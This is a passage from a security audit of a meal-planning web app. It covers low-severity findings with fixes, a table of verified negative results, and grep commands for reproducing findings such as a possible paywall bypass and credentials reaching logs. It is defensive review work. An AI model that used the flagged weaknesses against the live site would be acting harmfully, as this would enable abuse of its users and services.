## L-05 — `/api/track` accepts arbitrary unbounded event names
**Location:** [server.js:1334](server.js#L1334)
```js
const { event, data } = req.body;
if (!event) return res.status(400).json({ error: 'event required' });
```
`data` is size-checked (5,000 chars) but `event` is neither length-bounded nor type-checked nor allowlisted, and the endpoint is unauthenticated. Arbitrary event names pollute the `analytics` table that `getFunnelStats()` and `/api/analytics` read, corrupting business metrics and inflating storage.
**Fix:**
```js
const ALLOWED_EVENTS = new Set(['page_view','upgrade_click','demo_generated','plan_shared','cta_click']);
if (typeof event !== 'string' || !ALLOWED_EVENTS.has(event)) {
  return res.status(400).json({ error: 'unknown_event' });
}
```

## L-06 — Password-reset token carried in a URL query parameter
**Location:** [server.js:734](server.js#L734)
```js
const resetUrl = `${host}/reset-password.html?token=${rawToken}`;
```
The token is single-use, 1-hour, and SHA-256-hashed at rest — all correct. But a query parameter lands in browser history, and if `reset-password.html` ever loads a third-party script the token is readable from `location.search`. `Referrer-Policy: strict-origin-when-cross-origin` prevents cross-origin `Referer` leakage.
**Fix:** deliver via URL fragment (`#token=`), which is never sent to any server, and have the page read `location.hash` then immediately `history.replaceState` it away.

## L-07 — No per-account rate limit on password-reset requests
**Location:** [server.js:718](server.js#L718)
Only `authLimiter` (10/min/IP) applies. A distributed caller can send unlimited reset emails to one address — inbox flooding, plus consumption of the Resend quota.
**Fix:** track reset requests per email in the DB and cap at, say, 3 per hour, independent of source IP.

## L-08 — Internal admin pages served from the public web root
**Locations:** `public/analytics.html`, `public/growth-calculator.html`, `public/mockup-screenshot.html`
Served by `express.static` to anyone. Their *data* is gated behind `PRO_TOKEN`, so this is structure disclosure only — endpoint names, header names, metric names, and internal business logic that aids targeting.
**Fix:** move them outside `public/` and serve behind the authenticated-admin check from H-03, or delete `mockup-screenshot.html` if it is a leftover.

## L-09 — `ANTHROPIC_API_KEY` read from a relative `.env` path at runtime
**Location:** [server.js:406](server.js#L406)
```js
|| (() => { try { return require('fs').readFileSync('.env','utf8').split('\n')...
```
A documented workaround for Windows env-var override. It resolves `.env` relative to the process CWD, not `__dirname`, so behaviour depends on how the process is launched, and it makes the app read a secrets file from disk at runtime rather than relying on the process environment. Harmless on Render (where the env var is set) but fragile.
**Fix:** gate it to development and anchor the path:
```js
if (process.env.NODE_ENV !== 'production') { /* read path.join(__dirname, '.env') */ }
```

## L-10 — `uncaughtException` handler keeps the process running
**Location:** [server.js:2453](server.js#L2453)
```js
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', err.stack || err);
  // Don't exit — Render will restart if truly unrecoverable
});
```
After an uncaught exception the process state is undefined — half-completed writes, leaked handles, corrupted module state. Continuing risks serving wrong data rather than failing cleanly. The comment's assumption is inverted: Render restarts on *exit*, so suppressing exit prevents the restart.
**Fix:** log, flush, then exit and let the platform restart:
```js
process.on('uncaughtException', (err) => {
  logger.error('[uncaughtException]', { message: err.message, stack: err.stack });
  setTimeout(() => process.exit(1), 100);
});
```

## L-11 — Deprecated `X-XSS-Protection` header
**Location:** [server.js:100](server.js#L100)
```js
res.setHeader('X-XSS-Protection', '1; mode=block');
```
No modern browser implements this; Chrome removed the XSS Auditor in 2019. Harmless but misleading — it can read as XSS coverage that does not exist. CSP (M-03) is the actual control.
**Fix:** remove the line; rely on CSP.

## L-12 — Stray `public/files.zip` served publicly
**Location:** `public/files.zip` (426 KB, untracked)
Downloadable at `https://mealzy.org/files.zip`. Contents verified benign — seven icon/logo PNGs and favicons, matching the untracked icon files in the repo root. No secrets. Flagged because build artifacts accumulating in the web root is the pattern that eventually exposes something that matters.
**Fix:** delete it and add `public/*.zip` to `.gitignore`.

---

## Appendix A — Verified negative results

Checks performed that found no issues, recorded so future audits need not repeat them:

| Class | Result | Evidence |
|---|---|---|
| SQL injection | **Not present** | All queries use libSQL binding. `grep` for template-literal interpolation into SQL across `db.js`, `server.js`, `routes/` returned zero matches. |
| Command injection | **Not present** | No `eval`, `new Function`, `child_process`, `execSync`, or `spawn` in application code. |
| SSRF | **Not present** | All `fetch` targets are hardcoded hosts. User input reaches only the Unsplash query string, `encodeURIComponent`-wrapped. |
| Path traversal | **Not present** | All `sendFile` paths are code-defined constants; no user input reaches the filesystem. |
| File upload | **No disk writes** | Recipe photos are passed as base64 to Anthropic and never persisted. |
| Stripe webhook forgery | **Correctly handled** | `constructEvent` with raw body and `STRIPE_WEBHOOK_SECRET`; registered before `express.json()`; idempotent via `processed_webhook_events`. |
| Client-trusted Pro status | **Correctly handled** | Every Pro gate re-queries the DB (`server.js:1515`, `2075`, `921`; `routes/recipes.js:20`). The documented past vulnerability has not regressed. |
| CSRF | **Substantially mitigated** | `SameSite=Lax` on the session cookie blocks cross-site credentialed writes. No `SameSite=None` anywhere. |
| OAuth CSRF | **Correctly handled** | `state` parameter generated with `randomUUID`, stored in an `HttpOnly` cookie, verified at `server.js:813`. |
| React XSS | **Not present** | No `dangerouslySetInnerHTML` anywhere in `client/src/`. The live `/plan.html` is the auto-escaping React build. |
| Hardcoded secrets in tracked files | **One finding only** | Scan for `sk-ant-`, `sk_live_`, `pk_live_`, `whsec_`, `AIza`, JWT patterns across all tracked files returned only `cookies.txt` (H-06). |
| Secrets in git history | **None found** | No `.env`, `.pem`, or credential file has ever been added in any commit on any branch. |
| Workflow injection | **Not present** | No `pull_request_target`; no `${{ github.event.* }}` interpolation into `run:` blocks. |
| `.gitignore` coverage | **Mostly correct** | `.env`, `mealzy.db`, `*.log`, `dist/` all ignored. Gaps: `cookies.txt`, `server_err.txt`, `server_out.txt`. |

## Appendix B — Reproduction commands

```bash
# C-01 — is the paywall bypass live? Check the Render boot log for:
#   [startup] Missing/failed: ... PLAN_BYPASS_TOKEN ...
# If PLAN_BYPASS_TOKEN is listed, the bypass is active.

# Find any other request-value-vs-env-var comparison
grep -nE "(req\.(body|query|headers|params)[^=]*|\w+)\s*===?\s*process\.env\." server.js routes/*.js

# H-02 — credentials reaching logs
grep -rnE "console\.(log|error|warn)\([^)]*process\.env\." server.js db.js routes/ scripts/

# H-05 — spoofable client identity
grep -n "x-forwarded-for" server.js

# M-02 — unescaped innerHTML sinks
grep -rnE 'innerHTML\s*=.*\$\{' public/*.html public/js/*.js | grep -v escHtml

# M-13 — unscoped mutations in the data layer
grep -nE "DELETE FROM|UPDATE " db.js | grep -v "user_id"

# M-12 — dependency status (production tree only)
npm audit --omit=dev
```

---

*Static white-box review. No production exploitation was performed; findings marked conditional (C-01, M-01) depend on runtime environment state that must be confirmed against the Render deployment. Absence of a finding in this report is not proof of absence in the system.*
